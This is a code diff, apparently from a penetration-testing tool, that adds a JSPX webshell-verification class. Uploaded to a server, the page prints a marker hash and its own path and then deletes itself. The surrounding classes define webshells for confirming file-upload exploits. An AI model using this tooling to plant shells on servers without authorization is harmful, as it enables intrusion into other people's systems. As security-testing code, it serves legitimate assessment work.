@@ -125,6 +125,32 @@ class JspxShell(Webshell):
     _check_data = {'check': '1'}
     _keyword = '202cb962ac59075b964b07152d234b70'
 
+class JspxVerify(Webshell):
+    _content =  '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"\n' \
+                '          xmlns="http://www.w3.org/1999/xhtml"\n' \
+                '          xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2">\n' \
+                '    <jsp:directive.page contentType="text/html" pageEncoding="gb2312"/>\n' \
+                '    <jsp:directive.page import="java.io.*"/>\n' \
+                '    <html>\n' \
+                '        <body>\n' \
+                '            <jsp:scriptlet>\n' \
+                '               try {\n' \
+                '			out.print("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));\n' \
+                '			String path=request.getRealPath("/")+request.getServletPath();\n' \
+                '			out.print(path);\n' \
+                '			File d = new File(path);\n' \
+                '			if (d.exists()){\n' \
+                '				d.delete();\n' \
+                '			}\n' \
+                '		} catch (IOException e) {\n' \
+                '		System.err.println(e);\n' \
+                '		}\n' \
+                '            </jsp:scriptlet>\n' \
+                '        </body>\n' \
+                '    </html>\n' \
+                '</jsp:root>'
+    _keyword = '202cb962ac59075b964b07152d234b70'
+
 
 class JspShell(Webshell):
     # in jsp use equals to check strings equal.
